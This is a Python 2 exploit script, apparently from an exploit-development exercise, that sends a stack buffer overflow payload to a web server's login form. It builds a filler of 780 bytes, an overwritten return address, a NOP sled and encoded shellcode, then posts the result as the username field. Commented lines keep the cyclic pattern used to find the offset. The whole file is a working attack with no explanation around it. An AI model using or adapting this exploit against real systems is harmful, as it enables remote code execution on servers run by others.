#!/usr/bin/python

import socket

try:
        print "\n Sending ""evil"" buffer..."

#       size = 800
#       inputBuffer = "A" * size
#       inputBuffer = "AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

        shellcode = ("\xd9\xc1\xd9\x74\x24\xf4\xbe\x58\xb8\x85\xc5\x5f\x33\xc9\xb1"
        "\x52\x31\x77\x17\x83\xef\xfc\x03\x2f\xab\x67\x30\x33\x23\xe5"
        "\xbb\xcb\xb4\x8a\x32\x2e\x85\x8a\x21\x3b\xb6\x3a\x21\x69\x3b"
        "\xb0\x67\x99\xc8\xb4\xaf\xae\x79\x72\x96\x81\x7a\x2f\xea\x80"
        "\xf8\x32\x3f\x62\xc0\xfc\x32\x63\x05\xe0\xbf\x31\xde\x6e\x6d"
        "\xa5\x6b\x3a\xae\x4e\x27\xaa\xb6\xb3\xf0\xcd\x97\x62\x8a\x97"
        "\x37\x85\x5f\xac\x71\x9d\xbc\x89\xc8\x16\x76\x65\xcb\xfe\x46"
        "\x86\x60\x3f\x67\x75\x78\x78\x40\x66\x0f\x70\xb2\x1b\x08\x47"
        "\xc8\xc7\x9d\x53\x6a\x83\x06\xbf\x8a\x40\xd0\x34\x80\x2d\x96"
        "\x12\x85\xb0\x7b\x29\xb1\x39\x7a\xfd\x33\x79\x59\xd9\x18\xd9"
        "\xc0\x78\xc5\x8c\xfd\x9a\xa6\x71\x58\xd1\x4b\x65\xd1\xb8\x03"
        "\x4a\xd8\x42\xd4\xc4\x6b\x31\xe6\x4b\xc0\xdd\x4a\x03\xce\x1a"
        "\xac\x3e\xb6\xb4\x53\xc1\xc7\x9d\x97\x95\x97\xb5\x3e\x96\x73"
        "\x45\xbe\x43\xd3\x15\x10\x3c\x94\xc5\xd0\xec\x7c\x0f\xdf\xd3"
        "\x9d\x30\x35\x7c\x37\xcb\xde\x43\x60\xa4\xcf\x2c\x73\x4a\xf1"
        "\x17\xfa\xac\x9b\x77\xab\x67\x34\xe1\xf6\xf3\xa5\xee\x2c\x7e"
        "\xe5\x65\xc3\x7f\xa8\x8d\xae\x93\x5d\x7e\xe5\xc9\xc8\x81\xd3"
        "\x65\x96\x10\xb8\x75\xd1\x08\x17\x22\xb6\xff\x6e\xa6\x2a\x59"
        "\xd9\xd4\xb6\x3f\x22\x5c\x6d\xfc\xad\x5d\xe0\xb8\x89\x4d\x3c"
        "\x40\x96\x39\x90\x17\x40\x97\x56\xce\x22\x41\x01\xbd\xec\x05"
        "\xd4\x8d\x2e\x53\xd9\xdb\xd8\xbb\x68\xb2\x9c\xc4\x45\x52\x29"
        "\xbd\xbb\xc2\xd6\x14\x78\xf2\x9c\x34\x29\x9b\x78\xad\x6b\xc6"
        "\x7a\x18\xaf\xff\xf8\xa8\x50\x04\xe0\xd9\x55\x40\xa6\x32\x24"
        "\xd9\x43\x34\x9b\xda\x41")

        filler = "A" * 780
        eip = "\x83\x0c\x09\x10"
        offset = "C" * 4
        nops = "\x90" * 10

#       buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

        inputBuffer = filler + eip + offset + nops + shellcode

        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer +="Host: 0.0.0.0\r\n"
        buffer +="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
        buffer +="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer +="Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Accept-Encoding: gzip, deflate\r\n"
        buffer += "Referer: http://0.0.0.0/login\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Upgrade-Insecure-Requests: 1\r\n"
        buffer += "\r\n"

        buffer+= content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect (("0.0.0.0", 80))
        s.send(buffer)

        s.close()

        print"\n Nothing happened here..."

except:
        print"Cloud not connect!"
